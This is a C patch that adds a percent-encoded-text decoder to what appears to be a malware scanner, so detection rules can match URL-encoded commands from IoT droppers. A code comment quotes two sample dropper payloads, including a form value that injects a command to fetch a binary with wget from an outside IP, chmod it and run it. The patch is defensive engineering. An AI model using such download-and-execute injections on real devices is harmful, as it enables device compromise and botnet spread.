@@ -733,6 +733,141 @@ int kof_exe_unhex(uint8_t *p, uint64_t n)
  * than this has been answered enough. */
 #define DEC_MAX_SPAN  64u
 
+/* ---- percent-encoded text ------------------------------------------------
+ *
+ * ONE ESCAPE FORM, NAMED, AND NOT A FAMILY OF THEM.
+ *
+ * This decodes `%XX` and nothing else. It is not a general escape pass and must
+ * not become one: `\xNN`, `\NNN`, `&#NN;` and the rest are different
+ * conventions with different delimiters and different false-positive shapes,
+ * and each would need its own measurement before it could be let near a
+ * scanner's input.
+ *
+ * WHY THIS ONE. An IoT dropper carries its exploits as URLs and form bodies,
+ * and the command inside them is percent-encoded by the protocol rather than by
+ * the author:
+ *
+ *     Cmd=wget+http%3A%2F%2F104.168.11.84%2Fmips+-O+%2Fvar%2Ftmp%2Finit
+ *     remote_host=%3bcd+/tmp;wget+http:/...;chmod+777+x86;./x86
+ *
+ * The bytes a rule would be written against - "wget http://", ";chmod 777" -
+ * are not in the file at all; what is there is the same text with its
+ * separators spelled in hex. Decoded, one rule matches both the encoded and the
+ * plain form, which is what the view is for.
+ *
+ * WHAT STOPS IT FIRING ON ANYTHING ELSE, in the same three terms the hex pass
+ * uses and for the same reasons:
+ *
+ *   ENOUGH OF THEM. A run must carry PCT_MIN escapes. One `%2e` in a format
+ *   string or a version number is not an encoded payload, and a printf format
+ *   has at most a couple of `%` in a row that could be read as hex - `%ad`,
+ *   `%be` - while an encoded command has many.
+ *
+ *   ALL PRINTABLE. Every decoded byte must be text, which is what the encoding
+ *   exists to carry. A run that decodes to control bytes was not this.
+ *
+ *   DELIMITED. The run must follow a byte an argument follows - the same test
+ *   hex_delim answers - so a window onto the middle of something else cannot
+ *   become a payload.
+ */
+#define PCT_MIN       4u      /* escapes a run must carry to be one */
+#define PCT_RUN_MIN   8u      /* and bytes, so a scrap cannot qualify */
+#define PCT_MAX_PAY   32u
+
+/* What may sit between the escapes and still be one run: the characters a URL
+ * or a form body is made of. Anything else ends it. */
+static int pct_body(uint8_t c)
+{
+	return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'z') ||
+	       (c >= 'A' && c <= 'Z') ||
+	       c == '%' || c == '+' || c == '-' || c == '_' || c == '.' ||
+	       c == '~' || c == '/' || c == ':' || c == '&' || c == '=' ||
+	       c == '?' || c == '#' || c == ',' || c == ';' || c == '*' ||
+	       c == '!' || c == '(' || c == ')' || c == '\'' || c == '@' ||
+	       c == '$' || c == '[' || c == ']';
+}
+
+static int unpct_range(uint8_t *p, uint64_t n, uint64_t from, uint64_t to,
+		       struct kof_exe_span *wrote, uint32_t cap,
+		       uint32_t *n_wrote)
+{
+	uint64_t i;
+	uint32_t made = 0;
+	int changed = 0;
+
+	if (!p || !n)
+		return 0;
+	if (to > n)
+		to = n;
+
+	for (i = from; i < to && made < PCT_MAX_PAY; ) {
+		uint64_t beg, end, j, out_n = 0;
+		uint32_t esc = 0;
+		int text = 1;
+
+		if (!pct_body(p[i])) {
+			i++;
+			continue;
+		}
+		beg = i;
+		while (i < to && pct_body(p[i]))
+			i++;
+		end = i;
+		if (end - beg < PCT_RUN_MIN)
+			continue;
+		if (!hex_delim(beg ? p[beg - 1u] : 0))
+			continue;
+		/* Count them and read them in one pass: a `%` that is not
+		 * followed by two hex digits is an ordinary byte here, not a
+		 * malformed escape - the run is text either way. */
+		for (j = beg; j < end && text; j++) {
+			if (p[j] != '%')
+				continue;
+			if (j + 2u >= end ||
+			    hex_val(p[j + 1u]) < 0 || hex_val(p[j + 2u]) < 0)
+				continue;
+			esc++;
+			text = hex_text((uint8_t)((hex_val(p[j + 1u]) << 4) |
+						  hex_val(p[j + 2u])));
+			j += 2u;
+		}
+		if (!text || esc < PCT_MIN)
+			continue;
+		/*
+		 * DECODE IN PLACE. The write trails the read - three bytes in
+		 * for one out at every escape, one for one elsewhere - so the
+		 * output cannot overtake what has not been read.
+		 */
+		for (j = beg; j < end; j++) {
+			if (p[j] == '%' && j + 2u < end &&
+			    hex_val(p[j + 1u]) >= 0 &&
+			    hex_val(p[j + 2u]) >= 0) {
+				p[beg + out_n++] =
+					(uint8_t)((hex_val(p[j + 1u]) << 4) |
+						  hex_val(p[j + 2u]));
+				j += 2u;
+				continue;
+			}
+			/* `+` is a space in a form body, and the commands this
+			 * carries are separated by them. Left alone, the
+			 * decoded text reads "wget+http://..." and a rule
+			 * written on the plain command still misses. */
+			p[beg + out_n++] = p[j] == '+' ? (uint8_t)' ' : p[j];
+		}
+		/* The vacated tail. Zeros, for the reason at the top of this
+		 * file. */
+		memset(p + beg + out_n, 0, (size_t)(end - beg - out_n));
+		if (wrote && n_wrote && *n_wrote < cap) {
+			wrote[*n_wrote].off = beg;
+			wrote[*n_wrote].len = out_n;
+			(*n_wrote)++;
+		}
+		made++;
+		changed = 1;
+	}
+	return changed;
+}
+
 int kof_exe_decode(uint8_t *p, uint64_t n)
 {
 	struct kof_exe_span cur[DEC_MAX_SPAN], nxt[DEC_MAX_SPAN];
@@ -761,6 +896,12 @@ int kof_exe_decode(uint8_t *p, uint64_t n)
 			changed |= unb64_range(p, n, a, b, nxt, DEC_MAX_SPAN,
 					       &n_nxt);
 			changed |= unhex_range(p, n, a, b, nxt, DEC_MAX_SPAN,
+					       &n_nxt);
+			/* Last of the three: its runs are the widest - a URL
+			 * is mostly ordinary characters - so a base64 or hex
+			 * payload sitting inside one is read as itself first
+			 * and this only sees what is left. */
+			changed |= unpct_range(p, n, a, b, nxt, DEC_MAX_SPAN,
 					       &n_nxt);
 		}
 		for (k = 0; k < n_nxt; k++)
